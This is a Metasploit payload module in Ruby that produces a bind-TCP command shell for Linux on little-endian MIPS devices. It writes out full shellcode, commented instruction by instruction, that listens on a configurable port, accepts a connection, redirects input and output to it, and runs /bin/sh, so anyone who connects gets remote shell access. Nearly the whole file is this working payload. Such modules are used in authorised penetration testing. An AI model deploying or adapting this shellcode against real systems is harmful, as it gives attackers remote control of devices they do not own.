##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 232

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Bind TCP Inline',
      'Description'   => 'Listen for a connection and spawn a command shell',
      'Author'        =>
        [
          'scut',             # Original mips-irix-portshell shellcode
          'vaicebine',        # Original shellcode mod
          'Vlatko Kosturjak', # Metasploit module
          'juan vazquez'      # Small fixes and optimizations
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSLE,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' => {} ,
          'Payload' => ''
        })
    )
  end

  def generate
    if !datastore['LPORT']
      return super
    end

    port = Integer(datastore['LPORT'])
    port = [port].pack("n").unpack("cc");

    shellcode =
    "\xe0\xff\xbd\x27" + #     addiu   sp,sp,-32
    "\xfd\xff\x0e\x24" + #     li      t6,-3
    "\x27\x20\xc0\x01" + #     nor     a0,t6,zero
    "\x27\x28\xc0\x01" + #     nor     a1,t6,zero
    "\xff\xff\x06\x28" + #     slti    a2,zero,-1
    "\x57\x10\x02\x24" + #     li      v0,4183 ( __NR_socket )
    "\x0c\x01\x01\x01" + #     syscall

    "\xff\xff\x50\x30" + #     andi    s0,v0,0xffff
    "\xef\xff\x0e\x24" + #     li      t6,-17                        ; t6: 0xffffffef
    "\x27\x70\xc0\x01" + #     nor     t6,t6,zero                    ; t6: 0x10 (16)
    port.pack("C2") + "\x0d\x24" +  #     li      t5,0xFFFF (port)   ; t5: 0x5c11 (0x115c == 4444 (default LPORT))
    "\x04\x68\xcd\x01" + #     sllv    t5,t5,t6                      ; t5: 0x5c110000
    "\xfd\xff\x0e\x24" + #     li      t6,-3                         ; t6: -3
    "\x27\x70\xc0\x01" + #     nor     t6,t6,zero                    ; t6: 0x2
    "\x25\x68\xae\x01" + #     or      t5,t5,t6                      ; t5: 0x5c110002
    "\xe0\xff\xad\xaf" + #     sw      t5,-32(sp)
    "\xe4\xff\xa0\xaf" + #     sw      zero,-28(sp)
    "\xe8\xff\xa0\xaf" + #     sw      zero,-24(sp)
    "\xec\xff\xa0\xaf" + #     sw      zero,-20(sp)
    "\x25\x20\x10\x02" + #     or      a0,s0,s0
    "\xef\xff\x0e\x24" + #     li      t6,-17
    "\x27\x30\xc0\x01" + #     nor     a2,t6,zero
    "\xe0\xff\xa5\x23" + #     addi    a1,sp,-32
    "\x49\x10\x02\x24" + #     li      v0,4169 ( __NR_bind )A
    "\x0c\x01\x01\x01" + #     syscall

    "\x25\x20\x10\x02" + #     or      a0,s0,s0
    "\x01\x01\x05\x24" + #     li      a1,257
    "\x4e\x10\x02\x24" + #     li      v0,4174 ( __NR_listen )
    "\x0c\x01\x01\x01" + #     syscall

    "\x25\x20\x10\x02" + #     or      a0,s0,s0
    "\xff\xff\x05\x28" + #     slti    a1,zero,-1
    "\xff\xff\x06\x28" + #     slti    a2,zero,-1
    "\x48\x10\x02\x24" + #     li      v0,4168 ( __NR_accept )
    "\x0c\x01\x01\x01" + #     syscall

    "\xff\xff\xa2\xaf" + #     sw v0,-1(sp) # socket
    "\xfd\xff\x11\x24" + #     li s1,-3
    "\x27\x88\x20\x02" + #     nor s1,s1,zero
    "\xff\xff\xa4\x8f" + #     lw a0,-1(sp)
    "\x21\x28\x20\x02" + #     move a1,s1 # dup2_loop
    "\xdf\x0f\x02\x24" + #     li v0,4063 ( __NR_dup2 )
    "\x0c\x01\x01\x01" + #     syscall 0x40404
    "\xff\xff\x10\x24" + #     li s0,-1
    "\xff\xff\x31\x22" + #     addi s1,s1,-1
    "\xfa\xff\x30\x16" + #     bne s1,s0 <dup2_loop>

    "\xff\xff\x06\x28" + #     slti a2,zero,-1
    "\x62\x69\x0f\x3c" + #     lui t7,0x2f2f "bi"
    "\x2f\x2f\xef\x35" + #     ori t7,t7,0x6269 "//"
    "\xec\xff\xaf\xaf" + #     sw t7,-20(sp)
    "\x73\x68\x0e\x3c" + #     lui t6,0x6e2f "sh"
    "\x6e\x2f\xce\x35" + #     ori t6,t6,0x7368 "n/"
    "\xf0\xff\xae\xaf" + #     sw t6,-16(sp)
    "\xf4\xff\xa0\xaf" + #     sw zero,-12(sp)
    "\xec\xff\xa4\x27" + #     addiu a0,sp,-20
    "\xf8\xff\xa4\xaf" + #     sw a0,-8(sp)
    "\xfc\xff\xa0\xaf" + #     sw zero,-4(sp)
    "\xf8\xff\xa5\x27" + #     addiu a1,sp,-8
    "\xab\x0f\x02\x24" + #     li v0,4011 ( __NR_execve )
    "\x0c\x01\x01\x01"   #     syscall 0x40404

    return super + shellcode
  end
end
